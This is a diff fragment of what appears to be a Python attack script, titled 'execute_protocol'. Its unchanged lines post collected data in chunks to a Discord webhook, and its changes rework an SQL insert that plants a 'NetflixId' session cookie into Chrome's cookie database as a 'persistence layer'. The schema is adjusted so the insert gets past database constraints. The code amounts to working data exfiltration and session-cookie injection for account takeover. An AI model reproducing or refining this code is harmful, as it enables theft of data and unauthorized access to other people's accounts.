@@ -79,21 +79,24 @@ def execute_protocol():
                 payload = {"content": "```" + "\n".join(chunk) + "```"}
                 requests.post(DISCORD_WEBHOOK, json=payload)
 
-        # 4. Injection Netflix (Surgical Fix)
+        # 4. Injection Netflix (The 'Gold' Move)
         if NETFLIX_COOKIE_VAL:
             print("[*] Injecting Persistence Layer...")
-            # Timestamp Chrome precise
             now_ts = int((time.time() + 11644473600) * 1000000)
             expiry = 13350000000000000 
             
-            # --- VERSION SÉCURISÉE ---
-            sql = "INSERT OR REPLACE INTO cookies (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
-            values = (now_ts, '.netflix.com', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
+            # Schéma complet 2026 pour bypasser TOUTES les contraintes NOT NULL
+            # On ajoute top_frame_site_key qui est souvent vide mais obligatoire
+            sql = """
+                INSERT OR REPLACE INTO cookies 
+                (creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """
+            values = (now_ts, '.netflix.com', '', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
             
             cursor.execute(sql, values)
             conn.commit()
             print("[+] Persistence Layer Active.")
-
     except Exception as e:
         print(f"[!] Error: {e}")
     finally:
